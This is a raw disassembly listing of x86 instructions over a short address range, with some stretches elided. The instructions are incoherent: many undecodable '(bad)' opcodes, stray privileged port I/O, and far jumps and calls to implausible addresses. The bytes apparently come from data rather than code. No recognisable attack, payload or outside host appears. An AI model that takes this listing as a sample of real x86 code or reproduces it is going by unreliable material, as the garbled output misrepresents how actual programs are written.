  426d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d10:	and    al,0x73
  426d12:	clc    
  426d13:	inc    ebx
  426d14:	in     al,dx
  426d15:	pop    es
  426d16:	push   ebp
  426d17:	sbb    eax,eax
  426d19:	fmul   DWORD PTR [edx-0x134872a0]
  426d1f:	add    al,0x34
  426d21:	mov    ebp,0x4494e116
  426d26:	out    0xd3,eax
  426d28:	inc    edi
  426d29:	aas    
  426d2a:	jmp    0xa2dd3889
  426d2f:	popa   
  426d30:	mov    edi,0x25e9c0cc
  426d35:	push   ebp
  426d36:	in     al,dx
  426d37:	push   ebx
  426d38:	inc    ebp
  426d39:	xchg   ebp,eax
  426d3a:	xlat   BYTE PTR ds:[ebx]
  426d3b:	jg     0x426ce4
  426d3d:	lods   eax,DWORD PTR ds:[esi]
  426d3e:	adc    DWORD PTR [ecx+0x1f451841],esp
  426d44:	mov    ecx,0x9022f1b4
  426d49:	das    
  426d4a:	shl    BYTE PTR fs:[ebx-0x152b71bb],cl
  426d51:	adc    BYTE PTR [edi+0x55],0xf6
  426d55:	adc    eax,0x624d05bf
  426d5a:	jg     0x426d08
  426d5c:	sar    DWORD PTR [esi+0x4c],0x1
  426d60:	inc    eax
  426d61:	jp     0x426cfb
  426d63:	shl    DWORD PTR [eax],0x26
  426d66:	mov    ah,0x4b
  426d68:	and    bh,BYTE PTR [edx+0x62e67160]
  426d6e:	inc    esi
  426d6f:	popf   
  426d70:	or     cl,bl
  426d72:	jnp    0x426d2e
  426d74:	call   0x980a6305
  426d79:	mov    ds:0xf82563a,al
  426d7e:	ss push esi
  426d80:	xchg   edx,eax
  426d81:	fldenv [eax+eiz*4]
  426d84:	imul   eax,DWORD PTR [esi],0x3f
  426d87:	or     ebx,0x6a449752
  426d8d:	jecxz  0x426d34
  426d8f:	je     0x426d91
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xf80c:0xc7c2ecf9
  426e01:	nop
  426e02:	dec    esp
  426e03:	xchg   edx,eax
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	adc    al,0x67
  426e0e:	stc    
  426e0f:	pushf  
  426e10:	dec    BYTE PTR [ebp+0x3c]
  426e13:	mov    ebp,0x688eb8f5
  426e18:	lods   al,BYTE PTR ds:[esi]
  426e19:	fst    QWORD PTR [esi+0x6194b4f3]
  426e1f:	test   DWORD PTR [eax+0x7c],esi
  426e22:	inc    ebx
  426e23:	xor    eax,0x5330bb56
  426e28:	and    BYTE PTR [esi],ch
  426e2a:	mov    al,BYTE PTR [edx]
  426e2c:	or     ch,BYTE PTR [esi+0x36]
  426e2f:	out    0x3f,al
  426e31:	sahf   
  426e32:	or     eax,DWORD PTR [ebp-0x115d3280]
  426e38:	lds    edx,FWORD PTR [ebx+0x53]
  426e3b:	push   esi
  426e3c:	adc    esi,ebx
  426e3e:	jb     0x426e9c
  426e40:	push   eax
  426e41:	mov    edx,0xf9f62394
  426e46:	fiadd  DWORD PTR [ebx]
  426e48:	fsub   DWORD PTR [ecx]
  426e4b:	fimul  WORD PTR [ebx+0x6554c06c]
  426e51:	mov    ch,0xf7
  426e53:	mov    ch,0x83
  426e55:	dec    ebx
  426e56:	unpcklps xmm2,XMMWORD PTR [eax+ebx*4]
  426e5a:	xchg   DWORD PTR [ecx+0x4a],esi
  426e5d:	xor    eax,0xa5059cb8
  426e62:	push   esp
  426e63:	lahf   
  426e64:	dec    ebx
  426e65:	xchg   esp,eax
  426e66:	dec    ebx
  426e67:	mov    edx,?
  426e69:	inc    ebp
  426e6a:	dec    edi
  426e6b:	fdiv   DWORD PTR [esi]
  426e6d:	(bad)  
  426e6e:	jae    0x426ead
  426e70:	sahf   
  426e71:	jmp    0x426e5c
  426e73:	cmp    eax,0xbbe541eb
  426e78:	mov    ds:0x3844312e,eax
  426e7d:	inc    edx
  426e7e:	inc    eax
  426e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e80:	sub    DWORD PTR [esi+0x2a],0xdc73e69e
  426e87:	xor    edx,DWORD PTR [ebx-0x9]
  426e8a:	nop
  426e8b:	jecxz  0x426ed0
  426e8d:	scas   al,BYTE PTR es:[edi]
  426e8e:	jmp    0x4ee7:0x256a9faa
  426e95:	fs jg  0x426e6f
  426e98:	fstp   QWORD PTR [ebp-0x5987c38]
  426e9e:	sahf   
  426e9f:	in     al,dx
  426ea0:	jg     0x426f15
  426ea2:	jnp    0x426ef4
  426ea4:	push   edi
  426ea5:	sub    al,0xff
  426ea7:	(bad)  
  426ea8:	not    BYTE PTR [esi]
  426eaa:	jp     0x426e71
  426eac:	xor    BYTE PTR [esi],al
  426eae:	inc    edi
  426eaf:	inc    DWORD PTR [ebx]
  426eb1:	mov    DWORD PTR [ecx+ebp*2+0x5547dced],esp
  426eb8:	add    al,0x77
  426eba:	call   0xfc9706c7
  426ebf:	hlt    
  426ec0:	scas   al,BYTE PTR es:[edi]
  426ec1:	or     BYTE PTR [esi],0x5
  426ec4:	sbb    DWORD PTR [eax-0x5e],ebp
  426ec7:	cli    
  426ec8:	loopne 0x426e75
  426eca:	fimul  WORD PTR [edx-0x1122b0e0]
  426ed0:	and    DWORD PTR [ebp+0x47],edx
  426ed3:	xchg   ecx,eax
  426ed4:	lock inc edx
  426ed6:	das    
  426ed7:	int3   
  426ed8:	jnp    0x426f40
  426eda:	xchg   esi,eax
  426edb:	(bad)  [ebx-0x6c71ab07]
  426ee1:	bound  esi,QWORD PTR [esi+ebx*2+0x517c9d67]
  426ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ee9:	cmp    eax,0xf3012fdf
  426eee:	inc    edx
  426eef:	mov    ecx,0x31fcf983
  426ef4:	xor    al,0x27
  426ef6:	cmp    eax,0x21c1b8fd
  426efb:	mov    cl,0x3f
  426efd:	jmp    0xedad7aa1
  426f02:	jmp    0x48dd:0xfb20bff9
  426f09:	(bad)  
  426f0b:	cmp    bh,BYTE PTR es:[esi+0x69]
  426f0f:	lods   al,BYTE PTR ds:[esi]
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ecx+edx*4+0x85ce3c1],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	int3   
  426f8d:	and    BYTE PTR [ecx-0x79de3537],dh
  426f93:	sti    
  426f94:	scas   eax,DWORD PTR es:[edi]
  426f95:	sahf   
  426f96:	lds    eax,FWORD PTR [esi]
  426f98:	cmc    
  426f99:	sub    al,0x2a
  426f9b:	mov    WORD PTR [ebx-0x2b],fs
  426f9e:	enter  0xa7d2,0x63
  426fa2:	mov    edx,0xfbaf5ef1
  426fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fa8:	sti    
  426fa9:	(bad)  
  426faa:	cmp    esi,ebp
  426fac:	jmp    0x9502:0xb0537d14
  426fb3:	mov    ah,0xa5
  426fb5:	jbe    0x426fd3
  426fb7:	stos   DWORD PTR es:[edi],eax
  426fb8:	stos   BYTE PTR es:[edi],al
  426fb9:	push   ebx
  426fba:	popf   
  426fbb:	mov    esi,0xe1e987e2
  426fc0:	pop    ds
  426fc1:	int3   
  426fc2:	stos   BYTE PTR es:[edi],al
  426fc3:	sahf   
  426fc4:	aaa    
  426fc5:	jo     0x426f7c
  426fc7:	sar    edi,1
  426fc9:	cmp    esp,DWORD PTR [edi]
  426fcb:	popf   
  426fcc:	loopne 0x426ffc
  426fce:	cmp    BYTE PTR ds:0xe49ae786,dl
  426fd4:	fxch   st(7)
  426fd6:	hlt    
  426fd7:	adc    DWORD PTR [ebx-0x6c],ebp
  426fda:	and    eax,0xd1e5455a
  426fdf:	cwde   
  426fe0:	pusha  
  426fe1:	sbb    BYTE PTR [edx-0x63],bl
  426fe4:	mov    BYTE PTR [esi+0x6f],al
  426fe7:	push   esp
  426fe8:	cs mov cl,0x12
  426feb:	pusha  
  426fec:	pop    edi
  426fed:	push   esp
  426fee:	xor    bh,BYTE PTR ds:0x8203ca98
  426ff4:	shl    BYTE PTR [ecx],cl
  426ff6:	js     0x426fca
  426ff8:	jno    0x426fe8
  426ffa:	xor    eax,0xb6b0185e
  426fff:	sbb    al,BYTE PTR [edi+ebp*4]
  427002:	fisubr DWORD PTR [ecx-0x18]
  427005:	and    eax,0x920b6d22
  42700a:	das    
  42700b:	leave  
  42700c:	repz xchg esi,eax
  42700e:	cwde   
  42700f:	sbb    BYTE PTR [edi+0x5],al
  427012:	out    dx,al
  427013:	cmc    
  427014:	out    0xbe,eax
  427016:	out    dx,eax
  427017:	jp     0x427011
  427019:	test   eax,0x8577c80d
  42701e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42701f:	sub    DWORD PTR ds:0x54055aca,0x86d0fa5b
  427029:	jno    0x427090
  42702b:	shl    cl,0xa
  42702e:	xchg   esp,eax
  42702f:	cmp    eax,0x1cddb048
  427034:	xor    al,0xcd
  427036:	std    
  427037:	inc    eax
  427038:	call   0xcc28d814
  42703d:	or     al,0xe0
  42703f:	mov    al,ds:0x427371c0
  427044:	fsubr  QWORD PTR [edi+ecx*4+0x6ad91d7d]
  42704b:	dec    ebx
  42704c:	mov    ebx,DWORD PTR ds:0xef4ae53d
  427052:	daa    
  427053:	aam    0x3c
  427055:	or     BYTE PTR [ecx-0x25],al
  427058:	mov    ds:0x7ae79e83,al
  42705d:	mov    edi,0x5815ec15
  427062:	(bad)  
  427063:	daa    
  427064:	daa    
  427065:	dec    eax
  427066:	lea    esp,[esi+0x33b7aa69]
  42706c:	in     eax,0x45
  42706e:	in     al,dx
  42706f:	or     DWORD PTR [edi],esp
  427071:	hlt    
  427072:	jle    0x427014
  427074:	pop    eax
  427075:	(bad)  
  427076:	lock scas al,BYTE PTR es:[edi]
  427078:	add    BYTE PTR [ecx],0x58
  42707b:	inc    eax
  42707c:	pushf  
  42707d:	inc    ecx
  42707e:	rcl    ecx,1
  427080:	sbb    ecx,DWORD PTR [edx-0x12]
  427083:	je     0x4270ff
  427085:	jmp    0x42704a
  427087:	int    0x39
  427089:	xchg   ebp,eax
  42708a:	xchg   ecx,eax
  42708b:	push   esp
  42708c:	sar    DWORD PTR [ecx-0x6a],0xa9
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x69109d96
  427102:	add    BYTE PTR [ebp+0x1a10c],ah
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	cmp    BYTE PTR [ebx-0x36],dh
  42710f:	addr16 sbb al,0x9
  427112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427113:	and    al,0x25
  427115:	jge    0x427135
  427117:	cdq    
  427118:	fld    DWORD PTR [edx+0x36]
  42711b:	dec    BYTE PTR [ebp-0x1c]
  42711e:	jmp    0x5511:0xd648665c
  427125:	int    0x6a
  427127:	daa    
  427128:	shl    DWORD PTR [ebp-0x1f],0x27
  42712c:	ins    BYTE PTR es:[edi],dx
  42712d:	not    BYTE PTR [edx-0xa]
  427130:	push   edi
  427131:	push   cs
  427132:	jl     0x42716c
  427134:	int    0x41
  427136:	inc    esi
  427137:	jl     0x4270d2
  427139:	push   edi
  42713a:	outs   dx,DWORD PTR ds:[esi]
  42713b:	adc    eax,0x12e13d89
  427140:	ja     0x42710e
  427142:	or     DWORD PTR [esi+edi*8],0xfba1c313
  427149:	add    DWORD PTR [edx],0x65
  42714c:	stos   DWORD PTR es:[edi],eax
  42714d:	fs hlt 
  42714f:	repz pop es
  427151:	in     eax,0xca
  427153:	pushf  
  427154:	out    0x96,eax
  427156:	scas   eax,DWORD PTR es:[edi]
  427157:	add    al,0x6
  427159:	add    al,dh
  42715b:	mov    bl,0xd7
  42715d:	rcr    BYTE PTR [esi],cl
  42715f:	pop    es
  427160:	xchg   ebx,eax
  427161:	cld    
  427162:	mov    cl,0xa8
  427164:	fs out 0xb2,eax
  427167:	inc    edi
  427168:	pop    ds
  427169:	push   cs
  42716a:	xchg   esp,eax
  42716b:	sbb    edi,DWORD PTR [edx+0x1c]
  42716e:	loop   0x42715d
  427170:	fidiv  WORD PTR [ebx-0x7ed21e40]
  427176:	mov    ecx,0x28f250f4
  42717b:	clc    
  42717c:	mov    al,ch
  42717e:	inc    esp
  42717f:	leave  
  427180:	sbb    BYTE PTR [ebx-0x3c],0xcd
  427184:	das    
  427185:	jnp    0x42716e
  427187:	scas   al,BYTE PTR es:[edi]
  427188:	dec    edx
  427189:	(bad)  
  42718a:	pop    edx
  42718b:	pop    ebx
  42718c:	mov    DWORD PTR [edx-0x6baa6e8b],ebp
  427192:	sub    ebp,DWORD PTR [ecx]
  427194:	fs dec ebp
  427196:	adc    DWORD PTR [edx],ebx
  427198:	inc    ecx
  427199:	jmp    0x42716e
  42719b:	in     eax,0xb1
  42719d:	xor    edx,DWORD PTR [ecx+0x1b]
  4271a0:	mov    DWORD PTR [ebp-0x4e],ebp
  4271a3:	pop    edx
  4271a4:	rcr    BYTE PTR [ecx+0x15184537],cl
  4271aa:	xchg   DWORD PTR [ebp+0x66126720],edi
  4271b0:	xor    BYTE PTR [ecx+0x57c75b28],dh
  4271b6:	mov    edi,esp
  4271b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271b9:	xchg   BYTE PTR [ebx+0x37],ah
  4271bc:	fwait
  4271bd:	pop    eax
  4271be:	fsubp  st(2),st
  4271c0:	dec    edi
  4271c1:	mov    dh,0xa6
  4271c3:	and    DWORD PTR [ebp+0x6cd09ba6],ebx
  4271c9:	jl     0x427246
  4271cb:	scas   eax,DWORD PTR es:[edi]
  4271cc:	lds    ebx,FWORD PTR [eax]
  4271ce:	retf   
  4271cf:	mov    ds:0x50893e32,al
  4271d4:	jp     0x42716d
  4271d6:	push   esi
  4271d7:	in     eax,dx
  4271d8:	repz retf 0xacb9
  4271dc:	sbb    bl,BYTE PTR [edx+0x65aed6be]
  4271e2:	dec    edi
  4271e3:	push   ecx
  4271e4:	push   ebx
  4271e5:	mov    ch,0x9e
  4271e7:	xchg   edx,eax
  4271e8:	imul   ecx,DWORD PTR [ebx+0x51],0x88b412d5
  4271ef:	add    BYTE PTR [eax],bl
  4271f1:	packssdw mm7,QWORD PTR [ebp-0x6a3adfe2]
  4271f8:	imul   esi,ebp,0xb9a7c93
  4271fe:	out    dx,eax
  4271ff:	jl     0x427209
  427201:	mov    edi,0x2425d486
  427206:	sahf   
  427207:	shr    DWORD PTR [eax-0x34],0xf1
  42720b:	lds    ebx,FWORD PTR [edi+0x9e3c03]
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xcdbba0b9,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	mov    dh,0xe
  42728e:	aad    0x7d
  427290:	mov    ecx,0x924f22b9
  427295:	pop    eax
  427296:	fdivrp st(0),st
  427298:	pop    ss
  427299:	inc    BYTE PTR [edi+0x14]
  42729c:	out    dx,eax
  42729d:	test   al,0x3f
  42729f:	stc    
  4272a0:	mov    bh,0xe6
  4272a2:	cmp    DWORD PTR [ecx],esi
  4272a4:	call   0x8c8e5372
  4272a9:	(bad)  
  4272aa:	jmp    0x427287
  4272ac:	mov    bh,0x7e
  4272ae:	dec    edx
  4272af:	rcr    DWORD PTR [esi+0x24dedc67],0xb6
  4272b6:	xor    DWORD PTR [edi],ebx
  4272b8:	sub    dl,BYTE PTR [ebx+0x51]
  4272bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272bc:	out    dx,al
  4272bd:	jo     0x4272df
  4272bf:	orps   xmm2,XMMWORD PTR [edi]
  4272c2:	cs inc edx
  4272c4:	rol    DWORD PTR [ebp-0x56621904],0x6d
  4272cb:	fbstp  TBYTE PTR [edi+0x7cda9854]
  4272d1:	pop    edx
  4272d2:	mov    ss,edi
  4272d4:	loop   0x42731b
  4272d6:	rcr    cl,cl
  4272d8:	push   esp
  4272d9:	jbe    0x42728e
  4272db:	call   0xc6e15002
  4272e0:	sbb    ebp,edi
  4272e2:	imul   ecx,esi,0xc147d8ea
  4272e8:	cdq    
  4272e9:	sti    
  4272ea:	sbb    BYTE PTR [ebp+0x5f4535d],0x1e
  4272f1:	fs cs jb 0x427341
  4272f5:	and    ebp,DWORD PTR [esi-0xccc974d]
  4272fb:	mov    bl,0x89
  4272fd:	jge    0x427343
  4272ff:	in     eax,0x99
  427301:	mov    eax,ds:0xfb8957fc
  427306:	inc    ebp
  427307:	and    eax,0x5adcf34a
  42730c:	mov    edx,0x8b23092b
  427311:	push   es
  427312:	mov    BYTE PTR [eax-0x3],bh
  427315:	mov    ch,0x5c
  427317:	push   esp
  427318:	jb     0x4272af
  42731a:	pop    ss
  42731b:	mov    ah,0x30
  42731d:	(bad)  
  42731e:	retf   
  42731f:	lods   al,BYTE PTR ds:[esi]
  427320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427321:	in     al,0xb3
  427323:	push   eax
  427324:	pop    ebp
  427325:	sub    DWORD PTR [ecx],edi
  427327:	cmp    al,BYTE PTR [edi+0x10]
  42732a:	rcr    DWORD PTR [ebp+0x66],0x65
  42732e:	push   cs
  42732f:	mov    cl,0x6e
  427331:	sbb    al,0xaf
  427333:	dec    edx
  427334:	push   esp
  427335:	bound  eax,QWORD PTR [edx]
  427337:	mov    edx,0x26982a0d
  42733c:	or     BYTE PTR [eax+edi*4],bl
  42733f:	push   edi
  427340:	lods   eax,DWORD PTR ds:[esi]
  427341:	div    BYTE PTR [esi-0x68]
  427344:	sbb    ebp,0xffffffd0
  427347:	js     0x427387
  427349:	bndldx (bad),[ebp+0x5f770788]
  427350:	iret   
  427351:	bound  edi,QWORD PTR [eax-0x3c]
  427354:	mov    ebx,fs
  427356:	jl     0x427355
  427358:	out    0x3c,eax
  42735a:	gs dec esp
  42735c:	out    0x93,al
  42735e:	cwde   
  42735f:	jmp    0x635cb12c
  427364:	mov    edx,0xe555b576
  427369:	cwde   
  42736a:	or     eax,0x2631540e
  42736f:	adc    bl,BYTE PTR [ebp+0x303ee851]
  427375:	iret   
  427376:	xchg   edi,eax
  427377:	mov    BYTE PTR [eax],bh
  427379:	and    eax,0x2120450c
  42737e:	sub    al,ah
  427380:	mov    ds:0x67428c10,al
  427385:	push   ds
  427386:	loopne 0x4273b1
  427388:	(bad)  
  427389:	xor    al,0x9a
  42738b:	xor    DWORD PTR [ecx],ebp
  42738d:	(bad)  
  42738f:	jmp    0x427394
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ecx,ebx
  427401:	into   
  427402:	shl    DWORD PTR [esp+edx*1+0x40001a3],0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	(bad)  
  42740d:	js     0x42744d
  42740f:	xlat   BYTE PTR ds:[ebx]
  427410:	inc    edi
  427411:	cmp    eax,0x36f001c9
  427416:	popf   
  427417:	cld    
  427418:	mov    BYTE PTR [esi],cl
  42741a:	pop    ss
  42741b:	stos   DWORD PTR es:[edi],eax
  42741c:	in     eax,0xc2
  42741e:	adc    ecx,esi
  427420:	push   eax
  427421:	je     0x427458
  427423:	sbb    cl,BYTE PTR [eax-0x58f523ae]
  427429:	cmp    al,0x37
  42742b:	xchg   esi,eax
  42742c:	or     DWORD PTR [edi+0x5b7df68b],0xf29bc45d
  427436:	mov    dh,0x33
  427438:	fiadd  WORD PTR [ebx+0x8]
  42743b:	sahf   
  42743c:	arpl   WORD PTR [edx-0x80],ax
  42743f:	aas    
  427440:	(bad)  
  427441:	inc    ecx
  427442:	icebp  
  427443:	xchg   ebp,eax
  427444:	pop    ds
  427445:	mov    esi,0x674b33df
  42744a:	xor    ah,BYTE PTR ds:0x371cc438
  427450:	outs   dx,DWORD PTR ds:[esi]
  427451:	xchg   ebp,eax
  427452:	jge    0x42749e
  427454:	enter  0x49b6,0xa2
  427458:	ss xchg edi,eax
  42745a:	pop    esp
  42745b:	xor    al,0x7a
  42745d:	aas    
  42745e:	(bad)  [edi+0x8]
  427461:	push   ebx
  427462:	adc    DWORD PTR [esi],ecx
  427464:	xchg   ecx,eax
  427465:	in     eax,dx
  427466:	sar    esi,0x47
  427469:	je     0x4274c4
  42746b:	mov    fs,WORD PTR [ebx]
  42746d:	xor    esi,DWORD PTR [edi+eax*8+0x36c09f58]
  427474:	js     0x4274b6
  427476:	and    ch,BYTE PTR [ebx+eiz*4]
  427479:	ror    DWORD PTR [edi],1
  42747b:	ror    edx,0x7e
  42747e:	xor    BYTE PTR [eax-0x47],dh
  427481:	hlt    
  427482:	dec    ebp
  427483:	add    eax,0x7249f6fb
  427488:	enter  0x9528,0xc1
  42748c:	mov    gs,WORD PTR [edx-0x3a909182]
  427492:	push   cs
  427493:	jne    0x427495
  427495:	(bad)  
  427496:	or     ch,BYTE PTR [edx+0x13]
  427499:	and    BYTE PTR [ecx+0x1424e6a3],cl
  42749f:	pop    esi
  4274a0:	stos   DWORD PTR es:[edi],eax
  4274a1:	sbb    BYTE PTR [edi+0xa],bl
  4274a4:	fst    QWORD PTR [ebx-0x11]
  4274a7:	shl    BYTE PTR es:[edi+0x2a],cl
  4274ab:	jae    0x4274f6
  4274ad:	fsub   DWORD PTR [eax+0x1a]
  4274b0:	mov    ch,0x18
  4274b2:	mov    WORD PTR [esi+0x55],ds
  4274b5:	sbb    DWORD PTR [ebp-0x3895eff9],edi
  4274bb:	pop    edx
  4274bc:	in     al,dx
  4274bd:	aad    0x18
  4274bf:	cmp    DWORD PTR [edi-0x26ad71c3],edx
  4274c5:	mov    bh,0xa8
  4274c7:	bound  ecx,QWORD PTR [eax+ebx*4]
  4274ca:	ins    DWORD PTR es:[edi],dx
  4274cb:	pop    ebx
  4274cc:	fsub   QWORD PTR [ebx]
  4274ce:	fild   QWORD PTR [ecx+0x6915f813]
  4274d4:	cmp    ebp,ebp
  4274d6:	mov    ebp,0xbc627686
  4274db:	cmp    eax,0x949d3d91
  4274e0:	fdivr  DWORD PTR [edx]
  4274e2:	scas   al,BYTE PTR es:[edi]
  4274e3:	adc    al,0xa
  4274e5:	je     0x42752c
  4274e7:	repz mov eax,0xe2499929
  4274ed:	out    dx,eax
  4274ee:	fiadd  WORD PTR [ebx-0x48b00e41]
  4274f4:	dec    ebx
  4274f5:	out    0xaf,al
  4274f7:	and    BYTE PTR [ebx-0x15e214fe],0x40
  4274fe:	push   edx
  4274ff:	dec    eax
  427500:	stc    
  427501:	pop    ds
  427502:	retf   0xe9af
  427505:	bound  eax,QWORD PTR [edx-0x610b132a]
  42750b:	neg    DWORD PTR [edx]
  42750d:	sbb    al,BYTE PTR [ecx+0x8d]
	...
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	sbb    DWORD PTR [ebp-0x4f],edx
  427583:	mov    al,ds:0x1a418
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	sbb    DWORD PTR [edi+0x64],edx
  42758f:	jo     0x4275a3
  427591:	push   0x940b45e8
  427596:	or     bl,bh
  427598:	mov    ecx,0x37d37347
  42759d:	dec    ebp
  42759e:	and    BYTE PTR [esp+eax*2],bl
  4275a1:	ins    DWORD PTR es:[edi],dx
  4275a2:	pop    ebp
  4275a3:	inc    edi
  4275a4:	icebp  
  4275a5:	(bad)  
  4275a6:	and    DWORD PTR [esp+eiz*4],esi
  4275a9:	and    al,0x3
  4275ab:	dec    eax
  4275ac:	sub    al,0x73
  4275ae:	or     DWORD PTR [esp+eax*2+0x7b],edx
  4275b2:	xchg   esp,eax
  4275b3:	je     0x42759a
  4275b5:	nop
  4275b6:	mov    bl,0xe3
  4275b8:	call   0x826d5186
  4275bd:	inc    eax
  4275be:	retf   
  4275bf:	pop    ds
  4275c0:	popa   
  4275c1:	sub    eax,0xde1b1082
  4275c6:	pop    edi
  4275c7:	mov    dl,0x2f
  4275c9:	xor    DWORD PTR [eax-0x44],ebx
  4275cc:	cld    
  4275cd:	push   eax
  4275ce:	jns    0x42764a
  4275d0:	retf   0x91d2
  4275d3:	sbb    edx,ebp
  4275d5:	inc    edi
  4275d6:	(bad)  
  4275d7:	hlt    
  4275d8:	or     ah,BYTE PTR [edi-0x6d]
  4275db:	fnstsw WORD PTR [esp+eax*8]
  4275de:	jge    0x4275bd
  4275e0:	jo     0x427632
  4275e2:	mov    ds:0x5636eb3f,ax
  4275e8:	add    ebp,edi
  4275ea:	xchg   ecx,edx
  4275ec:	add    BYTE PTR [edx+0x15b866dc],0x77
  4275f3:	sub    eax,0x3017a54a
  4275f8:	into   
  4275f9:	lods   eax,DWORD PTR ds:[esi]
  4275fa:	inc    ecx
  4275fb:	aam    0x3a
  4275fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275fe:	mul    edi
  427600:	(bad)  
  427601:	inc    edx
  427602:	pop    es
  427603:	mov    edi,0xd1970a6d
  427608:	jmp    0x4275b7
  42760a:	pushf  
  42760b:	sbb    ebp,ecx
  42760d:	stos   BYTE PTR es:[edi],al
  42760e:	mov    dh,al
  427610:	test   BYTE PTR [eax],dh
  427612:	ret    
  427613:	adc    dh,BYTE PTR [ebx-0x3b]
  427616:	iret   
  427617:	jmp    0x6842cbb
  42761c:	push   edi
  42761d:	xchg   edx,eax
  42761e:	sbb    DWORD PTR [eax+edx*4],esi
  427621:	or     BYTE PTR ds:0x81ab7ae5,bh
  427627:	cmp    eax,0x50e450df
  42762c:	je     0x427604
  42762e:	or     DWORD PTR [ebp+0xf045342],edx
  427634:	push   esp
  427635:	ffreep st(4)
  427637:	(bad)  [esi-0xb5a2a2d]
  42763d:	adc    al,0xc
  42763f:	mov    edx,0xe9bce5c
  427644:	shl    eax,cl
  427646:	call   FWORD PTR [ecx-0x71e086b9]
  42764c:	add    al,0x54
  42764e:	jmp    0x62d77abd
  427653:	jae    0x42761d
  427655:	pop    esi
  427656:	aaa    
  427657:	jo     0x42760e
  427659:	fisubr WORD PTR [esi+0x7e]
  42765c:	add    BYTE PTR [ebx+0x4a],0x57
  427660:	imul   esi,DWORD PTR [edx-0x80],0xffffffec
  427664:	std    
  427665:	push   edx
  427666:	test   eax,0xe934b11a
  42766b:	pushf  
  42766c:	or     DWORD PTR [eax+0x12],ebp
  42766f:	mov    al,ds:0x6e5810b9
  427674:	xor    al,0xda
  427676:	(bad)  
  427677:	push   DWORD PTR [eax+eiz*4]
  42767a:	out    dx,eax
  42767b:	mov    edx,cs
  42767d:	and    ebp,DWORD PTR [ebx-0x1cd4db3a]
  427683:	dec    ecx
  427684:	int3   
  427685:	push   ebp
  427686:	pushf  
  427687:	push   0xffffffa1
  427689:	jmp    0x4276d5
  42768b:	cld    
  42768c:	retf   0x909f
  42768f:	sbb    al,BYTE PTR [eax]
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fxtract 
  427701:	stos   BYTE PTR es:[edi],al
  427702:	shr    DWORD PTR [ebx+0x1c],1
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	mov    dl,0xf3
  42770e:	enter  0xaa0f,0x40
  427712:	jmp    0x98812adf
  427717:	mov    eax,ds:0xb7836e59
  42771c:	pop    ecx
  42771d:	leave  
  42771e:	mov    ds:0x6481c1ff,eax
  427723:	lds    esi,FWORD PTR [eax]
  427725:	pop    eax
  427726:	add    cl,ch
  427728:	outs   dx,BYTE PTR ds:[esi]
  427729:	xor    cl,BYTE PTR [ebp+0x6b5cfd6]
  42772f:	ret    0xc99b
  427732:	mov    ecx,0x86ce4d9c
  427737:	jae    0x427794
  427739:	jecxz  0x4277ba
  42773b:	es dec si
  42773e:	fstp   QWORD PTR [esi-0x2c11ac59]
  427744:	xchg   esi,eax
  427745:	enter  0x613e,0x31
  427749:	daa    
  42774a:	ficomp WORD PTR [eax+eax*4]
  42774d:	pop    ebx
  42774e:	(bad)  
  42774f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427750:	cmp    al,0x8d
  427752:	out    0x2b,eax
  427754:	cmp    bl,ah
  427756:	out    dx,al
  427757:	push   ebp
  427758:	and    BYTE PTR [ebx],ah
  42775a:	pop    esi
  42775b:	stos   BYTE PTR es:[edi],al
  42775c:	inc    ebx
  42775d:	dec    esp
  42775e:	jle    0x427738
  427760:	in     eax,dx
  427761:	mov    al,0x71
  427763:	arpl   WORD PTR [ecx+0x6acee6e8],bx
  427769:	das    
  42776a:	adc    cl,BYTE PTR [esi+0x7c]
  42776d:	or     eax,DWORD PTR [esi]
